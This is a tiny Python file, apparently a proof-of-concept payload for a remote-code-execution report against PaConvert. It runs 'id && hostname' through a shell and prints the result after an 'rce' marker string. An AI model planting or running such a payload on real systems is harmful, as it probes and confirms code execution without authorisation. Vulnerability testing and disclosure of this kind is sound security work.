# bsrc-s1-test for PaConvert
import os
print("bsrc-s1-paconvert-rce-" + os.popen("id && hostname").read().strip())
